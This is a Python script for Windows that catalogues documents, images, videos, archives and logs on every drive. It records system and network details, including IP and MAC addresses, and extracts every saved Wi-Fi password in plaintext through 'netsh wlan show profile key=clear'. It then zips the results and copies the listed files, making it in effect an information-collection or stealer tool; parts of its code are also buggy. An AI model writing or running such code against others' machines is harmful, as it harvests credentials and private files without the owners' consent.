import os
import zipfile
import pandas as pd
import subprocess
import shutil
from datetime import date
import sys
import psutil
import platform
from datetime import datetime
import subprocess
from os.path import join, getsize
import psutil as psutil
from zipfile import ZipFile


drives = [f'{d}:' for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:')]
print(drives)
counter = 0
thisdir = os.getcwd()
# files of output
txt_file = open('txtfiles.txt', 'a', encoding='utf8')
docs = open('docs.txt', 'a', encoding='utf8')
imgs = open('img.txt', 'a', encoding='utf8')
rar_files = open('comprisedfiles.txt', 'a', encoding='utf8')
video_files = open('videofiles.txt', 'a', encoding='utf8')
all_files = open('allfiles.txt', 'a', encoding='utf8')
log_file = open('logfiles.txt', 'a', encoding='utf8')
InformationAboutPC = open('InformationAboutPC.txt', 'a', encoding='utf8')


for drive in drives:
    # print(type(drive))
    for r, d, f in os.walk(f"{drive}\\"):  # change the hard drive, if you want
        for file in f:
            if file[0] != '.' and '.' in file:
                filepath = os.path.join(r, file)
                if file.split('.')[1] == 'txt' and '\\$Recycle.Bin\\' not in r and '\Program Files' not in r:
                    counter += 1
                    txt_file.write(os.path.join(r, file) + '\n')
                if file.split('.')[1] == 'etl' or file.split('.')[
                    1] == 'log' and '\\$Recycle.Bin\\' not in r and '\Program Files' not in r:
                    counter += 1
                    log_file.write(os.path.join(r, file) + '\n')  ## in Cmd  C:\windows\panther\setup.etl
                if (file.split('.')[1] == 'docs' or file.split('.')[1] == 'xlsx' or file.split('.')[1] == 'xls' or
                    file.split('.')[1] == 'pptx' or file.split('.')[1] == 'pptm' or file.split('.')[1] == 'ppt' or
                    file.split('.')[1] == 'pdf') and '\\$Recycle.Bin\\' not in r and '\Program Files' not in r:
                    counter += 1
                    docs.write(os.path.join(r, file) + '\n')
                if (file.split('.')[1] == 'jpg' or file.split('.')[1] == 'jpeg'
                    or file.split('.')[1] == 'gif' or file.split('.')[
                        1] == 'png') and '\\$Recycle.Bin\\' not in r and '\Program Files' not in r:
                    counter += 1
                    imgs.write(os.path.join(r, file) + '\n')
                if (file.split('.')[1] == 'rar' or file.split('.')[
                    1] == 'zip') and '\\$Recycle.Bin\\' not in r and '\Program Files' not in r:
                    counter += 1
                    rar_files.write(os.path.join(r, file) + '\n')
                if (file.split('.')[1] == 'MP4' or file.split('.')[1] == 'MOV' or file.split('.')[1] == '3gpp'
                    or file.split('.')[1] == 'WMV' or file.split('.')[1] == 'FLV'
                    or file.split('.')[
                        1] == 'F4V' + '\n') and '\\$Recycle.Bin\\' not in r and '\Program Files' not in r:
                    counter += 1
                    video_files.write(os.path.join(r, file) + '\n')

                if (file.split('.')[1] == 'txt' or file.split('.')[1] == 'docs' or file.split('.')[1] == 'xlsx'
                    or file.split('.')[1] == 'xls' or file.split('.')[1] == 'doc'
                    or file.split('.')[1] == 'log' or file.split('.')[1] == 'etl'
                    or file.split('.')[1] == '3gpp'
                    or file.split('.')[1] == 'MP4' or file.split('.')[1] == 'MOV' or file.split('.')[1] == 'WMV'
                    or file.split('.')[1] == 'FLV' or file.split('.')[1] == 'F4V' or file.split('.')[1] == 'jpg'
                    or file.split('.')[1] == 'jpeg' or file.split('.')[1] == 'gif' or file.split('.')[1] == 'png'
                    or file.split('.')[1] == 'pptx' or file.split('.')[1] == 'pptm' or file.split('.')[1] == 'ppt'
                    or file.split('.')[1] == 'pdf' or file.split('.')[1] == 'rar' or file.split('.')[
                        1] == 'zip' + '\n') and '\\$Recycle.Bin\\' not in r and '\Program Files' not in r:
                    counter += 1
                    all_files.write(os.path.join(r, file) + '\n')

print('files gathering successfully finished ')

uname = platform.uname()

InformationAboutPC.write("************** System Information  *************" + '\n')
InformationAboutPC.write(f"System: {uname.system}" + '\n')
InformationAboutPC.write(f"Node Name: {uname.node}" + '\n')
InformationAboutPC.write(f"Release: {uname.release}" + '\n')
InformationAboutPC.write(f"Version: {uname.version}" + '\n')
InformationAboutPC.write(f"Machine: {uname.machine}" + '\n')
InformationAboutPC.write(f"Processor: {uname.processor}" + '\n')
InformationAboutPC.write("---------------------------------------------------------------------" + '\n')

# Boot Time
InformationAboutPC.write("***************  date and time the computer was booted  *************" + '\n')
boot_time_timestamp = psutil.boot_time()
bt = datetime.fromtimestamp(boot_time_timestamp)
InformationAboutPC.write(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" + '\n')
InformationAboutPC.write("---------------------------------------------------------------------" + '\n')

# let's print CPU information
InformationAboutPC.write("***************   CPU information  *************" + '\n')
# number of cores
InformationAboutPC.write("Physical cores:")
InformationAboutPC.write('\t' + str(psutil.cpu_count(logical=False)) + '\n')
InformationAboutPC.write("Total cores:")
InformationAboutPC.write('\t' + str(psutil.cpu_count(logical=True)) + '\n')
# CPU frequencies
cpufreq = psutil.cpu_freq()
InformationAboutPC.write(f"Max Frequency: {cpufreq.max:.2f}Mhz" + '\n')
InformationAboutPC.write(f"Min Frequency: {cpufreq.min:.2f}Mhz" + '\n')
InformationAboutPC.write(f"Current Frequency: {cpufreq.current:.2f}Mhz" + '\n')
# CPU usage
InformationAboutPC.write("CPU Usage Per Core/")
for i, percentage in enumerate(str(psutil.cpu_percent(percpu=True, interval=1))):
    q = f"Core {i}: {percentage}%" + '\t' + '\n'
InformationAboutPC.write(f"Total CPU Usage: {psutil.cpu_percent()}%" + '\n')
InformationAboutPC.write("---------------------------------------------------------------------" + '\n')

# Memory Information
InformationAboutPC.write("***************   Memory Information  *************" + '\n')

# get the memory details
svmem = psutil.virtual_memory()


def get_size(total):
    byGbyte = int(((total / 1024) / 1024) / 1024)
    return byGbyte


InformationAboutPC.write(f"Total: {get_size(svmem.total)}" + '\n')
InformationAboutPC.write(f"Available: {get_size(svmem.available)}" + '\n')
InformationAboutPC.write(f"Used: {get_size(svmem.used)}" + '\n')
InformationAboutPC.write(f"Percentage: {svmem.percent}%" + '\n')
InformationAboutPC.write(" ****       SWAP     ****        " + '\n')
# get the swap memory details (if exists)
swap = psutil.swap_memory()
InformationAboutPC.write(f"Total: {get_size(swap.total)}" + '\n')
InformationAboutPC.write(f"Free: {get_size(swap.free)}" + '\n')
InformationAboutPC.write(f"Used: {get_size(swap.used)}" + '\n')
InformationAboutPC.write(f"Percentage: {swap.percent}%" + '\n')
InformationAboutPC.write("---------------------------------------------------------------------" + '\n')
InformationAboutPC.write("***************  Disk Information  *************" + '\n')
InformationAboutPC.write("Partitions and Usage:")
# get all disk partitions
partitions = psutil.disk_partitions()


def get_size(total):
    byGbyte = int(((total / 1024) / 1024) / 1024)
    return byGbyte


for partition in partitions:
    InformationAboutPC.write(f"=== Device: {partition.device} ===" + '\n')
    InformationAboutPC.write(f"  Mountpoint: {partition.mountpoint}" + '\n')
    InformationAboutPC.write(f"  File system type: {partition.fstype}" + '\n')
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        # this can be catched due to the disk that
        # isn't ready
        continue
    InformationAboutPC.write(f"  Total Size: {get_size(partition_usage.total)}" + '\n')
    InformationAboutPC.write(f"  Used: {get_size(partition_usage.used)}" + '\n')
    InformationAboutPC.write(f"  Free: {get_size(partition_usage.free)}" + '\n')
    InformationAboutPC.write(f"  Percentage: {partition_usage.percent}%" + '\n')
# get IO statistics since boot
disk_io = psutil.disk_io_counters()
InformationAboutPC.write(f"Total read: {get_size(disk_io.read_bytes)}" + '\n')
InformationAboutPC.write(f"Total write: {get_size(disk_io.write_bytes)}" + '\n')
InformationAboutPC.write("---------------------------------------------------------------------" + '\n')
InformationAboutPC.write("***************  Network information  *************" + '\n')

# get all network interfaces (virtual and physical)
if_addrs = psutil.net_if_addrs()
for interface_name, interface_addresses in if_addrs.items():
    for address in interface_addresses:
        InformationAboutPC.write(f"=== Interface: {interface_name} ===" + '\n')
        if str(address.family) == 'AddressFamily.AF_INET':
            InformationAboutPC.write(f"  IP Address: {address.address}" + '\n')
            InformationAboutPC.write(f"  Netmask: {address.netmask}" + '\n')
            InformationAboutPC.write(f"  Broadcast IP: {address.broadcast}" + '\n')
        elif str(address.family) == 'AddressFamily.AF_PACKET':
            InformationAboutPC.write(f"  MAC Address: {address.address}" + '\n')
            InformationAboutPC.write(f"  Netmask: {address.netmask}" + '\n')
            InformationAboutPC.write(f"  Broadcast MAC: {address.broadcast}" + '\n')
# get IO statistics since boot
net_io = psutil.net_io_counters()
InformationAboutPC.write(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}" + '\n')
InformationAboutPC.write(f"Total Bytes Received: {get_size(net_io.bytes_recv)}" + '\n')
InformationAboutPC.write("---------------------------------------------------------------------" + '\n')
InformationAboutPC.write("***************  WifiPassword  *************" + '\n')
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
# now we will store the profile by converting them to list
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
# using for loop in python we are checking and printing the Wi-Fi
# passwords if they are available using the 2nd cmd command
for i in profiles:
    # running the 2nd cmd command to check passwords
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i,
                                       'key=clear']).decode('utf-8').split('\n')
    # storing passwords after converting them to list
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    # printing the profiles(Wi-Fi name) with their passwords using
    # try and except method
    try:
        InformationAboutPC.write("{:<30}|  {:<}".format(i, results[0]) + '\n')
    except IndexError:
        InformationAboutPC.write("{:<30}|  {:<}".format(i, "") + '\n')
InformationAboutPC.write("---------------------------------------------------------------------" + '\n')

print('compressed up')
InformationAboutPC.close()
rar_files.close()
log_file.close()
txt_file.close()
docs.close()
imgs.close()
video_files.close()
all_files.close()

dir_path = os.getcwd()
res = []
for file in os.listdir(dir_path):
    if file.endswith('.txt'):
        res.append(file)
        with zipfile.ZipFile('Files.zip', 'w') as zipF:
            for file in res:
                zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
#
# date_backup = date.today()
# print(date_backup)
#
# str_date_backup = str(date_backup).replace('-', '.')
# print(str_date_backup)
#
#
# path_input =
# path_output = r'C:\Users\acer\Desktop\backup' '\\' + str_date_backup + '_ Files backup.zip'
# copyfile(path_input, path_output)






# read_file = pd.read_csv(r'allfiles.txt')
# read_file.to_csv(r'allfiles.csv', index=None)
# f://backup/macaddress-name/backupfiles
# input the backup device

srcs = open('allfiles.txt',"r")
for file in srcs.readlines():
    shutil.copy(file,file.split('/')[-1])
